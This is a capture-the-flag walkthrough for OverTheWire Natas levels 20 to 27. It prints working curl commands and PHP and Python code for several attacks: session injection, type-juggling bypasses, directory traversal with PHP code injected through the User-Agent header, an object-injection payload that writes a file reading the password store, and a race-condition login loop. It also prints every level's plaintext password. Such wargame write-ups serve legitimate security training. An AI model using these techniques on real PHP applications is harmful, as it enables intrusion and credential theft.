# Natas

## level 20

This level we try to write ```admin 1``` to the session file and save the cookie in ```cookie.txt```.

```
$ curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org/?name=ving%0Aadmin%201&debug' -c cookie.txt
```

The session file will be writen as below.

```
name ving
admin 1
```

```
$ curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org/?debug -b cookie.txt
```

```
You are an admin. The credentials for the next level are:
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

## level 21

```php
<?php
// http://natas21-experimenter.natas.labs.overthewire.org/index-source.html
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
?>
```

This give us chance to set ```admin``` value and save the cookie.

```
$ curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org/?debug -d 'admin=1' -d 'submit=Update' -c cookie.txt
```

```
$ curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/?debug -b 'PHPSESSID=g6vcjrla9bv83197qugg85juo3'
```

```
You are an admin. The credentials for the next level are:
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

## level 22

```php
<?php
// http://natas22.natas.labs.overthewire.org/index-source.html
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

We can't see the password in browser because we are redirected to ```/```.
Fortunately, there is no ```exit``` after redirection and the password is sent to browser client in fact.

```
$ curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
```

```
You are an admin. The credentials for the next level are:
Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

## level 23

```php
<?php
// http://natas23.natas.labs.overthewire.org/index-source.html
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
?>
```

The password must include ```iloveyou``` and be greater than ```10``` after converted to integer.

```
$ curl -u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org/ -F 'passwd=11iloveyou'
```

```
The credentials for the next level are:
Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

## level 24

```php
<?php
// http://natas24.natas.labs.overthewire.org/index-source.html
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
?>
```

Read the [PHP manual](http://php.net/manual/en/function.strcmp.php#102677). ```strcmp('pending',array())``` will return ```-1``` in PHP 5.2.16 (probably in all versions prior 5.3), but will return ```0``` in PHP 5.3.3.
If we pass the ```passwd``` value as an array, it's all solved.

```
$ curl -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org/ -F 'passwd[]=ving'
```

```
The credentials for the next level are:
Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

## level 25

```php
<?php
// http://natas25.natas.labs.overthewire.org/index-source.html
function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)){
        include($filename);
        return 1;
    }
    return 0;
}
?>
```

```../``` will be replaced by space to prevent directory traversal attempt and the path can not contain ```natas_webpass```, So we can not get the password directly.

But we can use the path below to read the log file. After replacement, ```..././..././..././..././..././tmp/natas25_<PHPSESSID>.log``` becomes ```../../../../../tmp/natas25_<PHPSESSID>.log```.

```php
<?php
// http://natas25.natas.labs.overthewire.org/index-source.html
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n";
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
?>
```

Now we want to write the password in the log file. The log records ```HTTP_USER_AGENT```, So we can inject some codes in it.

```
$ curl -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org/ -b 'PHPSESSID=v1347323qckbp3kbcj4f13tmq2' -H 'User-Agent: <?php echo file_get_contents("/etc/natas_webpass/natas26") ?>' -F 'lang=..././..././..././..././..././tmp/natas25_v1347323qckbp3kbcj4f13tmq2.log'
```

Then read the log file again.

```
[11.08.2016 07::47:57] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T "Directory traversal attempt! fixing request."
```

## level 26

The level is about [php object injection](https://www.owasp.org/index.php/PHP_Object_Injection).

```php
<?php
// http://natas26.natas.labs.overthewire.org/index-source.html
function storeData(){
    $new_object=array();

    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        $new_object["x1"]=$_GET["x1"];
        $new_object["y1"]=$_GET["y1"];
        $new_object["x2"]=$_GET["x2"];
        $new_object["y2"]=$_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    else{
        // create new array
        $drawing=array();
    }

    $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing)));
}
?>
```

This level allows me to inject codes via cookie.

Let's create a new object.

```php
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($file){
        $this->initMsg="";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27') ?>";
        $this->logFile = "img/ving.php";
    }
    function log($msg){
        ;
    }
    function __destruct(){
        ;
    }
}
$new_object = new Logger("hello");
echo base64_encode(serialize($new_object));
?>
```

```
$ curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/ -b 'drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3ZpbmcucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjE6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3JykgPz4iO30='
```

We steal the password successfully.

```
$ curl -u natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/ving.php
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```

## level 27

```php
<?php
// http://natas27.natas.labs.overthewire.org/index-source.html
function checkCredentials($link,$usr,$pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}
?>
```

```mysql_real_escape_string``` makes SQL injection really difficult.

The trick to beating this level is in the comments at the top of the page.

```
// database gets cleared every 5 min
```

We can do this by spamming login attempts to the server and if we post at the exact moment where the database gets cleared but the natas28 user is not automatically added yet, we can create our own natas28 user.
It seems the database clearing and creation of the natas28 user is not in one transaction but has some delay between them.

```python
#!/usr/bin/env python3
import requests

params = {'username': 'natas28', 'password': ''}
auth = ('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')
while True:
    r = requests.get('http://natas27.natas.labs.overthewire.org/', params = params, auth = auth)
    if 'Here' in r.text:
        print(r.text)
        break
```

```
Welcome natas28!
Here is your data:
Array
(
    [username] => natas28
    [password] => JWwR438wkgTsNKBbcJoowyysdM82YjeF
)
```
